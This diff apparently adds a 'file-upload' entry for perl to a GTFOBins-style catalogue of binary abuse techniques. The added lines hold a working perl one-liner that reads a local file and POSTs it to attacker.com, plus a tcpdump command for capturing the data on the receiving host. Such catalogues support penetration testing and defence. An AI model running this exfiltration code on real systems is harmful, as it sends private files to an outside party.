@@ -6,6 +6,14 @@ functions:
     - code: |
         LFILE=file_to_read
         perl -ne print $LFILE
+  file-upload:
+    - description: Send local file via "d" parameter of a HTTP POST request. Capture content on attacker host, example: `LPORT=8080; tcpdump -i any -s 0 -l -A "tcp dst port $LPORT and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)" | awk 'BEGIN { show=0 } /Connection: close/ { show=1; next } show'`
+    - code: |
+        export RHOST=attacker.com
+        export RPORT=8080
+        export URL=/exploit.sh
+        export LFILE=output.txt
+        perl -MIO::Socket::INET -e '$s = new IO::Socket::INET(PeerAddr=>$ENV{"RHOST"}, PeerPort=>$ENV{"RPORT"}, Proto=>"tcp") or die;open(my $file, "<", $ENV{"LFILE"}) or die;$content = join("", <$file>);close($file);$post_data = "d=" . $content;$headers = "POST " . $ENV{"URL"} . " HTTP/1.1\r\nHost: " . $ENV{"RHOST"} . "\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " . length($post_data) . "\r\nConnection: close\r\n\r\n";print $s $headers . $post_data;while (<$s>) { }close($s);'
   file-download:
     - description: Download a file via HTTP. For example, run `python3 -m http.server 8080` on the serving side.
       code: |
